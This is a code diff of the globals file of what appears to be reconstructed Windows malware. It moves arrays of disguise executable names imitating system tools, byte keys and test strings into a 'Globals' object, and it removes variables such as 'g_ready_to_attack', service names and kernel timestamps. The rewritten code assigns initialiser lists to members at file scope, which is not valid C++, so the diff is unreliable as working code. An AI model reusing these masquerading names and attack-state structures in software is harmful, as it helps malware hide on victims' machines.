@@ -17,8 +17,10 @@
 // MODIFIED BY mic.ric.tor
 #include "Global.h"
 
-/** -------------->> Segment ".data" <<-------------- **/
-WCHAR g_random_exec_name[29][15] = 
+
+CGlobals Globals;
+
+Globals.random_exec_name =
 {
 	L"caclsrv",
 	L"certutl",
@@ -51,14 +53,14 @@ WCHAR g_random_exec_name[29][15] =
 	L"extract"
 };
 
-char g_keys[4][4] =
+Globals.keys =
 {
 	{0x25, 0x7F, 0x5D, 0xFB},
 	{0x17, 0xD4, 0xBA, 0x00},
 	{0x5C, 0xC2, 0x1A, 0xBB}
 };
 
-WCHAR g_test50[6][50] =
+Globals.test50 =
 {
 	L"test123",
 	L"test456",
@@ -68,27 +70,9 @@ WCHAR g_test50[6][50] =
 	L"789"
 };
 
-WCHAR g_test100[3][100] =
+Globals.test100 =
 {
 	L"123123",
 	L"456456",
 	L"789789"
 };
-
-FILETIME g_kernel_creation_time   = {};
-FILETIME g_kernel_last_write_time = {};
-
-WCHAR g_windows_directory[40] = {};
-
-/** ----->> Undeclared <<----- **/
-WCHAR g_unk_pool[30];
-WCHAR g_module_path[MAX_PATH];
-FILETIME g_kernel_last_access_time;
-WCHAR **g_argv;
-INT32 g_argc;
-RTL_CRITICAL_SECTION g_critical_section;
-bool g_ready_to_attack;
-DWORD g_svc_id;
-WCHAR g_svc_name[50];
-DWORD g_netinit_id;
-WCHAR g_netinit_name[50];
